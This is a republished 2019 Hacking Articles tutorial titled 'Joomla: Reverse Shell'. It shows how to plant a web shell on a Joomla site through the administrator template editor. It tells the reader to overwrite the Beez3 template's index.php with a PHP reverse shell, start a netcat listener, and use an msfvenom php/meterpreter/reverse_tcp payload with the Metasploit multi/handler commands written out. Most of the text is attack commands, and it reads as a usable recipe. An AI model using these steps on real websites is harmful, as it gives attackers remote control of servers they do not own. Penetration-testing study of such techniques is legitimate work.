---
title: 'Joomla: Reverse Shell'
date: 2019-10-29T18:22:00+01:00
draft: false
---

Joomla is one of the popular Content Management System (CMS) which helps you to build your website. Joomla has gained its popularity by being user-friendly as its complication-free when during installation; and it is also pretty reliable. In this article, we learn how to get a reverse shell of Joomla.

As you can see in the image below, the website is made in Joomla. Now, that we have our Joomla environment we start exploiting it. 

![](https://i1.wp.com/1.bp.blogspot.com/-kFYnSXVFvW4/XbhytR0HSQI/AAAAAAAAhHM/ZFun5TCVmS4dzxFg-ozNawhkDhCXTbT5ACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

The attack that we are going to show is categorised under post-exploitation; which means one should have login credentials of Joomla. The URL of the login page of Joomla will be consisted of ‘joomla/administrator’ and here, enter username and password as shown in the image below :

![](https://i2.wp.com/1.bp.blogspot.com/-6umI-JWZE9M/Xbhys7tf32I/AAAAAAAAhHI/uSPRNBEnG2krL4iqU9hU40NFQ4C_IeaTwCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

Once you are logged in, go to extensions. A drop-down menu will appear, from this menu select templates; just like it has been shown in the image below :

![](https://i1.wp.com/1.bp.blogspot.com/-ivTpSjYQ_ts/XbhyuF5215I/AAAAAAAAhHQ/nluZvOXQFC4S3nF1F99ciTA9t46ksRoggCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Implementing the above will show you the list of templates present in the website and so we will exploit one of them i.e. Beez3 details and files.  

![](https://i1.wp.com/1.bp.blogspot.com/-EiyVCaIk9TA/XbhyueifHFI/AAAAAAAAhHU/dTiGQ73dYlwdy4E5jVUXRFi3BVFYtNUwgCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Once, you are in the template, go to index.php as shown in the image below :

![](https://i0.wp.com/1.bp.blogspot.com/-8t_C9g7WwIE/XbhyuViZrTI/AAAAAAAAhHY/3v6UyRDMRN0gadbnFc9rTADqX8feLt2oACLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

This way you will able to edit index.php in the template as you can see in the image below :

![](https://i1.wp.com/1.bp.blogspot.com/-5or2amsT7Mg/XbhyvK4qO1I/AAAAAAAAhHc/EesrAnhDa9UJW89rNfqZ_fK78vMUEt84ACLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

Now, swap the code of index.php with the reverse shellcode i.e. found in Kali Linux and add your IP and port in the code just like it has been shown in the image below :

![](https://i2.wp.com/1.bp.blogspot.com/-jIjLpkMU3oE/Xbhyva9IR2I/AAAAAAAAhHg/eibg_vUUqkk8BJomiURNysps9wZEv6tPACLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Now, activate netcat to get a session with the following command :

```
nc -lvp 1234
```

![](https://i0.wp.com/1.bp.blogspot.com/-cooH80pCEz8/XbhyvhJMHmI/AAAAAAAAhHk/S1t3dFtcWEweh6TS2W-RumxpNe63B-94wCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

Another way to get a reverse shell is by msfvenom, and for this type the following command :

```
msfvenom -p php/meterpreter/reverse\_tcp lhost =192.168.0.9 lport=1234 R
```

![](https://i2.wp.com/1.bp.blogspot.com/-wKmFKhjxmQ4/XbhywOcLLvI/AAAAAAAAhHo/BAiKdbBUhMsajvDKV9_FR5WfIp85UKRAgCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

The above command will give you the malicious php code. Swap this code just like before  and simultaneously start the multi/handler as shown in the image below :

```
use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set lhost 192.168.0.9  
set lport 1234  
exploit
```

![](https://i2.wp.com/1.bp.blogspot.com/-OvSq7FWQ9VM/Xbhys2uBpRI/AAAAAAAAhHE/yvE-s5rD4cMC32FT5jmr6WzP7MeztVnGgCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

These were the two ways to get a reverse shell in Joomla.

**Author**: **Yashika Dhir** is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact **[here](https://www.linkedin.com/in/yashika-dhir-b94722a3?trk=pulse-det-athr_prof-art_hdr)**

The post [Joomla: Reverse Shell](https://www.hackingarticles.in/joomla-reverse-shell/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2MX3IKI